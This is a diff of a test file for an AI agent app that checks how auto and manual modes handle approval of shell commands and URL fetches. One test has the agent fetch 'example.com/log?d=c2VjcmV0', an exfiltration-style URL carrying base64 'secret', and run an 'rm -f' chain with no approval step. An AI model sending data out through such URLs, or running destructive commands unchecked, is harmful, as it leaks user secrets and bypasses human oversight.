@@ -45,8 +45,8 @@ test('Auto mode: writes a file, runs a command without asking, then answers', ()
   await app.waitFor(() => !fs.existsSync(path.join(app.workspace, 'hello/hello.py')), 'undo to remove the file');
 }));
 
-test('Auto mode still asks before a risky command; denied, it doesn\'t run and the model hears why', () => withApp({}, [
-  { tools: [call('run_command', { command: 'touch ran.txt && rm -f nothing.txt' })] },
+test('Manual mode asks before a command; denied, it doesn\'t run and the model hears why', () => withApp({ settings: { mode: 'manual' } }, [
+  { tools: [call('run_command', { command: 'touch ran.txt' })] },
   { content: 'Understood, I won\'t run it.' },
 ], async (app, model) => {
   const sending = app.start('Touch a file');
@@ -56,6 +56,31 @@ test('Auto mode still asks before a risky command; denied, it doesn\'t run and t
   await sending;
   assert(!fs.existsSync(path.join(app.workspace, 'ran.txt')));
   assert.match(toolResults(model.requests[1])[0], /The user denied this run_command\. Reason: use Python instead/);
+}));
+
+const fetchStub = { 'tool:fetch_url': ({ url }) => `HTTP 200 ${url}\n\nPage text` };
+
+test('Auto mode runs risky-looking commands and fetches any URL without asking', () => withApp({ settings: { web: true }, overrides: fetchStub }, [
+  { tools: [call('run_command', { command: 'touch ran.txt && rm -f ran.txt && touch kept.txt' })] },
+  { tools: [call('fetch_url', { url: 'https://example.com/log?d=c2VjcmV0' })] },
+  { content: 'Done.' },
+], async (app, model) => {
+  await app.start('Look into example.com');
+  assert.equal(app.window.document.querySelectorAll('.tool-actions').length, 0, 'no approval cards');
+  assert(fs.existsSync(path.join(app.workspace, 'kept.txt')));
+  assert.match(toolResults(model.requests[2])[1], /^HTTP 200 https:\/\/example.com\/log\?d=/);
+}));
+
+test('Manual mode asks before fetching a URL that didn\'t come from the user or a search', () => withApp({ settings: { web: true, mode: 'manual' }, overrides: fetchStub }, [
+  { tools: [call('fetch_url', { url: 'https://example.com/docs' })] },
+  { content: 'Done.' },
+], async (app, model) => {
+  const sending = app.start('Look into example.com');
+  await app.waitFor(() => app.buttons('Approve')[0], 'the approval card');
+  assert.equal(model.requests.length, 1, 'the fetch waits for approval');
+  await app.click('Approve');
+  await sending;
+  assert.match(toolResults(model.requests[1])[0], /^HTTP 200 https:\/\/example.com\/docs/);
 }));
 
 test('Auto mode keeps going past the effort\'s step limit by itself', () => withApp({ settings: { effort: 'low' } }, [
